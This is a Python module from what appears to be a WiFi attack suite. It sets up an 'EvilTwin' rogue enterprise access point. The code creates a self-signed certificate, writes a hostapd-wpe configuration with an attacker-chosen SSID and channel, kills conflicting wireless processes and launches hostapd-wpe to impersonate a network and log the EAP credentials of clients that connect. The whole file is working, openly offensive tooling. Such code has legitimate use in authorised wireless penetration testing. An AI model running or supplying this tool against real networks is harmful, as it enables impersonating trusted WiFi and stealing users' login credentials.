# Module: eviltwin.py
# Description: Creates an EAP based access point AKA EvilTwin.
# Author: Nick Sanzotta
# Contributors: 
# Version: v 1.08162017

try:
	import os, sys, time, threading
	from subprocess import Popen, PIPE
	from theme import *
except Exception as e:
	print('\n [!] Error ' +str(e))

class evilTwin(threading.Thread):
	def __init__(self, interface, ssid, channel, macaddress, \
	 certname, country, state, city, company, ou, email):
		threading.Thread.__init__(self)
		self.setDaemon(0) # Creates thread in non-daemon mode
		self.interface = interface
		self.wirelessInt = str(self.interface.get_ifname())
		self.macaddress = macaddress
		self.ssid = ssid
		self.channel = channel
		self.certname = certname
		self.country = country
		self.state = state
		self.city = city
		self.company = company
		self.ou = ou
		self.email = email
		self.server_cert = 'data/certs/server_cert.pem'
		self.private_key = 'data/certs/private_key.pem'

	def run(self):
		self.sslCert(self.country, self.state, self.city, self.company, self.ou, self.certname, self.email)
		self.dependency_check()
		self.hostapd_config()
		self.sanity_check()
		time.sleep(1)
		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
		print('[i] Real-time hostapd-wpe logs below:\n')
		for line in iter(p1.stdout.readline, ''):
		    sys.stdout.write(line)
		    # f.write(line)
	
	def dependency_check(self):
		'''Checks if hostapd-wpe is installed, if not installs it'''
		p1 = Popen(['which', 'hostapd-wpe'], stdout=PIPE)
		if p1.communicate()[0]:
			p2 = Popen(["dpkg-query", "-W", "-f", "${version}", "hostapd-wpe"], stdout=PIPE)
			print(blue('i')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
		else:
			print(blue(i)+'Installing hostapd-wpe ...')
			p3 = Popen(['apt-get install -y hostapd-wpe'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
			p3.wait()
			print(' [*] Installation completed')
			os.system('which hostapd-wpe')
			os.system('hostapd-wpe -v')
			print('\n')
			# print(p2.communicate())
	
	def sanity_check(self):
		'''Terminates conflicting processes'''
		p1 = Popen(['airmon-ng','check','kill'], stdout=PIPE)

	def fix_broken_package(self):
		'''Fixes broken hostapd-wpe packages'''
		os.system('apt-get purge hostapd-wpe')
		os.system('apt-get update')
		os.system('apt-get install hostapd-wpe')
		#/var/run/hostapd-wpe/wlan0

	def hostapd_config(self):
		'''Creates hostadp-wpe config file based of parameter values'''
		# Open original hostapd-wpe configuration file.
		with open('/etc/hostapd-wpe/hostapd-wpe.conf', 'r') as f1:
		    # Read a List of lines into data
		    data = f1.readlines()

		# Lines to modify in hostapd-wpe config file
		data[3] = 'interface=%s\n' % (self.wirelessInt)
		data[14]= 'ssid=%s\n' % (self.ssid)
		data[15]= 'channel=%s\n' % (self.channel)
		data[8] = 'server_cert=%s\n' % (self.server_cert)
		data[9] = 'private_key=%s\n' % (self.private_key)

		print(green('*')+'EvilTwin Details:')
		print('     AP Interface: %s' % (self.wirelessInt))
		print('     SSID: %s' % (self.ssid))
		print('     Channel: %s' % (self.channel))
		print('     Server Cert: %s' % (self.server_cert))
		print('     Private Key: %s' % (self.private_key))

		# Save new hostapd-wpe config file in WiFiSuite's data/hostapd-wpe directory
		with open('data/hostapd-wpe/hostapd-wpe.conf', 'w') as f1:
		    f1.writelines( data )

	def sslCert(self, country, state, city, company, orgUnit, fqdn, email):
		'''Create SSL Cert with Specified Values '''
		cert = """openssl \
		req \
		-nodes \
	    -x509\
	    -newkey rsa:2048 \
	    -keyout data/certs/private_key.pem \
	    -out data/certs/server_cert.pem \
	    -days 365\
	    -subj "/C={0}/ST={1}/L={2}/O={3}/OU={4}/CN={5}/emailAddress={6}"
		"""
		createCert = cert.format(country, state, city, company, orgUnit, fqdn, email)
		p1 = Popen([createCert],shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
		p1.wait()
		# for line in iter(p1.stdout.readline, ''):
		#     sys.stdout.write(line)
		print(green('*') + 'New SSL Certificate Created:')

		# Design Reference: 
		# Line4: # interface=wlan0
		# Line7: # eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
		# Line8: # ca_cert=/etc/hostapd-wpe/certs/ca.pem
		# Line9: # server_cert=/etc/hostapd-wpe/certs/server.pem
		# Line10:# private_key=/etc/hostapd-wpe/certs/server.key
		# Line11:# private_key_passwd=whatever
		# Line12:# dh_file=/etc/hostapd-wpe/certs/dh
		# Line15:# ssid=hostapd-wpe
		# Line16:# channel=1